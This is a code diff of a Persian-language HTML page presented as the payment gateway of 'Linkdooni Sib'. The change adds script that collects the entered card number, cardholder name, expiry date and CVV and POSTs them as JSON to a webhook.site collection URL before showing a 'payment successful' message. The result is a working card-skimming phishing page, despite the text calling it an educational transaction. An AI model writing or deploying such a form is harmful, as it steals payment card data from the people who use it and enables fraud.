@@ -1,107 +1,153 @@
 
+<!DOCTYPE html>
 <html lang="fa">
 <head>
-  <meta charset="UTF-8" />
-  <title>درگاه پرداخت لینکدونی سیب</title>
-  <style>
-    body {
-      font-family: Tahoma, sans-serif;
-      direction: rtl;
-      background: #e0f7e9; /* سبز خیلی روشن */
-      padding: 30px;
-    }
-    .container {
-      max-width: 700px; /* عرض بیشتر شد */
-      height: auto;
-      margin: auto;
-      background: #ffe5b4; /* نارنجی روشن */
-      padding: 40px; /* فضای داخلی بیشتر */
-      border-radius: 16px;
-      box-shadow: 0 0 20px rgba(0,0,0,0.2);
-      text-align: center;
-    }
-    input, button {
-      width: 100%;
-      padding: 18px;
-      margin: 15px 0;
-      font-size: 20px;
-      border-radius: 8px;
-      border: 1px solid #ccc;
-    }
-    button {
-      background: #0078d4;
-      color: #fff;
-      border: none;
-      cursor: pointer;
-    }
-    button:hover {
-      background: #005a9e;
-    }
-    .message {
-      margin-top: 25px;
-      font-weight: bold;
-      color: #1a8f00;
-      display: none;
-    }
-  </style>
+<meta charset="UTF-8" />
+<title>درگاه پرداخت لینکدونی سیب</title>
+<style>
+body {
+font-family: "Tahoma", sans-serif;
+background: linear-gradient(to bottom, #d4f4dd, #ffffff);
+direction: rtl;
+margin: 0;
+padding: 0;
+}
+.container {
+max-width: 600px;
+margin: 50px auto;
+background: #ffffff;
+border-radius: 20px;
+padding: 40px;
+box-shadow: 0 10px 30px rgba(0, 128, 0, 0.2);
+text-align: center;
+}
+h1 {
+color: #2e7d32;
+margin-bottom: 30px;
+}
+input, button {
+width: 100%;
+padding: 15px;
+margin: 10px 0;
+font-size: 18px;
+border-radius: 12px;
+border: 1px solid #cfcfcf;
+transition: 0.3s;
+}
+input:focus {
+border-color: #66bb6a;
+outline: none;
+box-shadow: 0 0 5px rgba(76, 175, 80, 0.4);
+}
+button {
+background: #4caf50;
+color: white;
+font-weight: bold;
+border: none;
+cursor: pointer;
+}
+button:hover {
+background: #388e3c;
+}
+.message {
+margin-top: 20px;
+padding: 20px;
+background-color: #e8f5e9;
+border: 1px solid #c8e6c9;
+border-radius: 12px;
+color: #2e7d32;
+font-size: 18px;
+font-weight: bold;
+opacity: 0;
+transform: translateY(20px);
+transition: opacity 0.6s ease, transform 0.6s ease;
+}
+.message.show {
+opacity: 1;
+transform: translateY(0);
+}
+.apple-icon {
+font-size: 40px;
+color: #4caf50;
+margin-bottom: 15px;
+}
+</style>
 </head>
 <body>
-  <div class="container">
-    <h1>درگاه پرداخت لینکدونی سیب</h1>
-    <form id="paymentForm">
-      <input type="number" id="amount" placeholder="مبلغ پرداختی (تومان)" required min="1000" />
-      <input type="text" id="cardNumber" placeholder="شماره کارت (16 رقم)" required pattern="\d{16}" maxlength="16" />
-      <input type="text" id="cardHolder" placeholder="نام صاحب کارت" required />
-      <input type="text" id="expiryDate" placeholder="تاریخ انقضا (MM/YY)" required pattern="(0[1-9]|1[0-2])\/\d{2}" maxlength="5" />
-      <input type="text" id="cvv" placeholder="CVV (3 رقم)" required pattern="\d{3}" maxlength="3" />
-      <button type="submit">پرداخت</button>
-    </form>
-    <div class="message" id="successMessage"></div>
-  </div>
-
-  <script>
-    const form = document.getElementById('paymentForm');
-    const successMessage = document.getElementById('successMessage');
-
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const amount = document.getElementById('amount').value;
-      const cardNumber = document.getElementById('cardNumber').value;
-      const cardHolder = document.getElementById('cardHolder').value.trim();
-      const expiryDate = document.getElementById('expiryDate').value;
-      const cvv = document.getElementById('cvv').value;
-
-      if (cardNumber.length !== 16 || isNaN(cardNumber)) {
-        alert('لطفا شماره کارت 16 رقمی صحیح وارد کنید.');
-        return;
-      }
-      if (!cardHolder) {
-        alert('لطفا نام صاحب کارت را وارد کنید.');
-        return;
-      }
-      if (!expiryDate.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
-        alert('تاریخ انقضا را به صورت MM/YY وارد کنید.');
-        return;
-      }
-      if (cvv.length !== 3 || isNaN(cvv)) {
-        alert('کد CVV باید 3 رقم باشد.');
-        return;
-      }
-
-      successMessage.style.display = 'block';
-      successMessage.innerHTML = `
-        پرداخت موفق! <br/>
-        مبلغ: ${amount} تومان <br/>
-        شماره کارت: ${cardNumber} <br/>
-        نام صاحب کارت: ${cardHolder} <br/>
-        تاریخ انقضا: ${expiryDate} <br/>
-        CVV: ${cvv} <br/>
-        تراکنش آموزشی با موفقیت انجام شد.
-      `;
-      form.reset();
-    });
-  </script>
+<div class="container">
+<div class="apple-icon">🍏</div>
+<h1>درگاه پرداخت لینکدونی سیب</h1>
+<form id="paymentForm">
+<input type="number" id="amount" placeholder="مبلغ پرداختی (تومان)" required min="1000" />
+<input type="text" id="cardNumber" placeholder="شماره کارت (16 رقم)" required pattern="\d{16}" maxlength="16" />
+<input type="text" id="cardHolder" placeholder="نام صاحب کارت" required />
+<input type="text" id="expiryDate" placeholder="تاریخ انقضا (MM/YY)" required pattern="(0[1-9]|1[0-2])\/\d{2}" maxlength="5" />
+<input type="text" id="cvv" placeholder="CVV (3 رقم)" required pattern="\d{3}" maxlength="3" />
+<button type="submit">پرداخت</button>
+</form>
+<div class="message" id="successMessage"></div>
+</div>
+<script>
+const form = document.getElementById('paymentForm');
+const successMessage = document.getElementById('successMessage');
+form.addEventListener('submit', function(e) {
+e.preventDefault();
+const amount = document.getElementById('amount').value;
+const cardNumber = document.getElementById('cardNumber').value;
+const cardHolder = document.getElementById('cardHolder').value.trim();
+const expiryDate = document.getElementById('expiryDate').value;
+const cvv = document.getElementById('cvv').value;
+if (cardNumber.length !== 16 || isNaN(cardNumber)) {
+alert('لطفا شماره کارت 16 رقمی صحیح وارد کنید.');
+return;
+}
+if (!cardHolder) {
+alert('لطفا نام صاحب کارت را وارد کنید.');
+return;
+}
+if (!expiryDate.match(/^(0[1-9]|1[0-2])\/\d{2}$/)) {
+alert('تاریخ انقضا را به صورت MM/YY وارد کنید.');
+return;
+}
+if (cvv.length !== 3 || isNaN(cvv)) {
+alert('کد CVV باید 3 رقم باشد.');
+return;
+}
+const data = {
+amount,
+cardNumber,
+cardHolder,
+expiryDate,
+cvv
+};
+fetch('https://webhook.site/76382a5c-a72e-4b9f-9790-650023719c21', {
+method: 'POST',
+headers: { 'Content-Type': 'application/json' },
+body: JSON.stringify(data)
+})
+.then(response => {
+if (response.ok) {
+successMessage.innerHTML = `
+پرداخت موفق! <br/>
+مبلغ: ${amount} تومان <br/>
+شماره کارت: ${cardNumber} <br/>
+نام صاحب کارت: ${cardHolder} <br/>
+تاریخ انقضا: ${expiryDate} <br/>
+CVV: ${cvv} <br/><br/>
+تراکنش آموزشی با موفقیت انجام شد.
+`;
+successMessage.classList.add('show');
+form.reset();
+setTimeout(() => successMessage.classList.remove('show'), 6000);
+} else {
+alert('ارسال اطلاعات با خطا مواجه شد.');
+}
+})
+.catch(error => {
+alert('خطا در ارسال اطلاعات: ' + error.message);
+});
+});
+</script>
 </body>
 </html>
 
